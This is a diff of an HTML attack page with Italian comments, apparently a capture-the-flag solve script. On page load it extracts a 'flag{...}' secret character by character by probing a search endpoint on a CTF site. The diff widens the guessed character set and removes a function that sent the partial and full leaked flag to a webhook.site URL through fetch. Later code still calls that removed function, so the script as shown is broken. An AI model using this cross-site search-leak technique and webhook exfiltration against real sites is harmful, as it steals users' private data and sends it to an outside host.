@@ -20,7 +20,7 @@
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+        const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|:;"\'<>,.?/~`';
         let flag = 'flag{'; // Inizializza con l'inizio del formato della flag
         let position = 5;   // Posizione della lettera attuale nella flag da testare
 
@@ -42,24 +42,28 @@
         };
 
         // Funzione che prova ogni carattere alla posizione attuale
+        // Funzione che prova ogni carattere nella posizione attuale
         const extractFlag = async () => {
             const resultDiv = document.getElementById('result');
-            
+
             for (let char of characters) {
                 // Prova ogni carattere nella posizione corrente
                 const url = `https://matrix.capturetheflags.site/search?s=${flag}${char}`;
                 const isCorrect = await leakCharacter(url);
 
+                // Invia log a ogni tentativo di carattere
+                await logResult(`Tentativo di ${flag}${char}: ${isCorrect ? 'Risorsa accessibile' : 'Risorsa non accessibile'}`);
+                
                 if (isCorrect) {
                     // Aggiorna la flag trovata e sposta alla posizione successiva
                     flag += char;
                     position++;
                     resultDiv.textContent = `Flag parziale trovata: ${flag}`;
-                    
-                    // Invia il log al Webhook con la flag parziale trovata
+
+                    // Log della flag parziale trovata
                     await logResult(`Flag parziale trovata: ${flag}`);
 
-                    // Se abbiamo trovato "}", terminiamo il ciclo perché la flag è completa
+                    // Se abbiamo trovato "}", termina il ciclo perché la flag è completa
                     if (char === '}') {
                         resultDiv.textContent = `Flag completa trovata: ${flag}`;
                         await logResult(`Flag completa trovata: ${flag}`);
@@ -70,31 +74,13 @@
                     break;
                 }
             }
-            // Ricomincia il processo per la prossima posizione
-            setTimeout(extractFlag, 1000); // Ritardo per evitare sovraccarico
+            // Ricomincia il processo per la prossima posizione dopo un ritardo
+            setTimeout(extractFlag, 1000); // 1 secondo di ritardo
         };
 
-        // Funzione per inviare i log al Webhook
-        const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad';
-            try {
-                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                const response = await fetch(urlWithParams, {
-                    method: 'GET',
-                });
-
-                if (!response.ok) {
-                    console.error('Errore durante l\'invio del log:', response.statusText);
-                } else {
-                    console.log('Log inviato con successo');
-                }
-            } catch (error) {
-                console.error('Errore di rete:', error);
-            }
-        };
-
-        // Avvia l'estrazione della flag al caricamento del DOM
+        // Inizia il processo quando il DOM è pronto
         document.addEventListener('DOMContentLoaded', extractFlag);
+
     </script>
 </body>
 </html>
